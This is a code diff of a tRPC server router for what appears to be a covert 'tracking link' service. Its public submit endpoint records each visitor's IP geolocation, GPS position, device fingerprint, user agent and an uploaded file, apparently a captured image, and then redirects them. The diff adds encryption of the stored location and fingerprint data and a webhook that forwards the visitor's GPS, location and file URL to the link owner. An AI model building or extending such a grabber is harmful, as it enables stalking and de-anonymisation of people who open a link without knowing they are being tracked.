@@ -1,7 +1,9 @@
 import { COOKIE_NAME } from "@shared/const";
 import { getIpLocation } from "./ipGeo";
 import { testSmtpConnection } from "./email";
+import { sendWebhookNotification } from "./webhook";
 import { checkRateLimit } from "./rateLimiter";
+import { encrypt, decrypt } from "./crypto";
 import { getSessionCookieOptions } from "./_core/cookies";
 import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
@@ -36,6 +38,8 @@ export const appRouter = router({
           recipient: setting.recipient,
           emailSubjectTemplate: setting.emailSubjectTemplate || "",
           emailHtmlTemplate: setting.emailHtmlTemplate || "",
+          webhookUrl: setting.webhookUrl || "",
+          webhookType: setting.webhookType || "dingtalk",
         };
       }
       const host = process.env.SMTP_HOST;
@@ -49,6 +53,8 @@ export const appRouter = router({
         recipient: process.env.NOTIFICATION_EMAIL || user || "",
         emailSubjectTemplate: "",
         emailHtmlTemplate: "",
+        webhookUrl: "",
+        webhookType: "dingtalk",
       };
     }),
     saveSmtp: protectedProcedure
@@ -61,6 +67,8 @@ export const appRouter = router({
           recipient: z.string(),
           emailSubjectTemplate: z.string().optional(),
           emailHtmlTemplate: z.string().optional(),
+          webhookUrl: z.string().optional(),
+          webhookType: z.string().optional(),
         })
       )
       .mutation(async ({ input, ctx }) => {
@@ -74,6 +82,8 @@ export const appRouter = router({
           recipient: input.recipient,
           emailSubjectTemplate: input.emailSubjectTemplate || null,
           emailHtmlTemplate: input.emailHtmlTemplate || null,
+          webhookUrl: input.webhookUrl || null,
+          webhookType: input.webhookType || "dingtalk",
         });
         return { success: true };
       }),
@@ -140,11 +150,18 @@ export const appRouter = router({
       .query(async ({ input, ctx }) => {
         const userLinks = await db.getTrackingLinks(ctx.user.id);
         const userLinkIds = userLinks.map((l) => l.id);
+        let list = [];
         if (input.linkId) {
           if (!userLinkIds.includes(input.linkId)) return [];
-          return await db.getCaptures(input.linkId);
+          list = await db.getCaptures(input.linkId);
+        } else {
+          list = await db.getCaptures(undefined, userLinkIds);
         }
-        return await db.getCaptures(undefined, userLinkIds);
+        return list.map((c) => ({
+          ...c,
+          gps: decrypt(c.gps || ""),
+          fingerprint: decrypt(c.fingerprint || ""),
+        }));
       }),
 
     submit: publicProcedure
@@ -196,12 +213,15 @@ export const appRouter = router({
         const s3Result = await storagePut(fileName, buffer, mime);
 
         const now = new Date();
+        const encryptedGps = encrypt(input.gps || "Nicht verfügbar");
+        const encryptedFingerprint = encrypt(input.fingerprint || "Unbekannt");
+
         await db.createCapture({
           id: captureId,
           linkId: input.linkId,
           ip: ipWithLoc,
-          gps: input.gps || "Nicht verfügbar",
-          fingerprint: input.fingerprint || "Unbekannt",
+          gps: encryptedGps,
+          fingerprint: encryptedFingerprint,
           resolution: input.resolution || "Unbekannt",
           userAgent: userAgent,
           filePath: s3Result.url,
@@ -218,6 +238,16 @@ export const appRouter = router({
           createdAt: now,
           userId: link.userId,
         }).catch((err) => console.error("[SMTP] Mail error:", err));
+
+        sendWebhookNotification({
+          linkId: input.linkId,
+          ip: ipWithLoc,
+          gps: input.gps || "Nicht verfügbar",
+          resolution: input.resolution || "Unbekannt",
+          filePath: s3Result.url,
+          createdAt: now,
+          userId: link.userId,
+        }).catch((err) => console.error("[Webhook] Error:", err));
 
         return { success: true, redirectUrl: link.redirectUrl };
       }),
